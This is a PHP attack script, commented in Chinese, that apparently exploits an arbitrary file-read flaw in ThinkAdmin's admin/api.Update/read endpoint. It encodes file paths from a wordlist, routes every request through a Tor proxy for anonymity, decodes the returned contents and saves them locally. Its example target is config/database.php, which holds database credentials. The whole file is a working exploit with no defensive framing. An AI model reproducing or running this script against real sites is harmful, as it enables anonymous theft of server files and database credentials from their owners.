<?php
//文件CRUD函数
function write2File($decoded_content, $filePath){
   $myfile = fopen($filePath, "w") or die("Unable to open file!");
   fwrite($myfile, $decoded_content);
   fclose($myfile);
}

function readFromFile($filePath){
   $lines = file($filePath);
   return $lines;
}

//加密解密函数
function encode($content)
{
   [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))];
   for ($i = 0; $i < $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
   return $chars;
}

function base64decode($content){
    return base64_decode($content);
}

//curl相关函数
function request_tor($url){
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050"); 
   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME); 
   $output = curl_exec($ch);
   $decoded_output = json_decode($output, true);
   $extracted_output = $decoded_output['data']['content'];
   $curl_error = curl_error($ch);
   curl_close($ch);
   return $extracted_output;
}

function readOne($path, $base_url){
   //encode and concat 
   $encoded_path = encode($path);
   $base_url .=$encoded_path;
   //request
   $response = base64decode(request_tor($base_url));
   //write to file
   write2file($response,str_replace('/', '', $path));
}

function readMul($wordlist, $base_url){
   foreach(file($wordlist) as $word){
     $word = str_replace("\n","",$word);
     readOne($word,$base_url);
   }
}

try{
   $dir_txt = "/目录/enum_thinkadmin/dir.txt";
   $url = "https://站点/index.php?s=admin/api.Update/read/";
   $web_dir = "config/database.php";
   readMul($dir_txt, $url);
   //readOne($web_dir,$url)
}
catch(Exception $e){
   echo 'Error:' .$e->getMessage();
}

?>
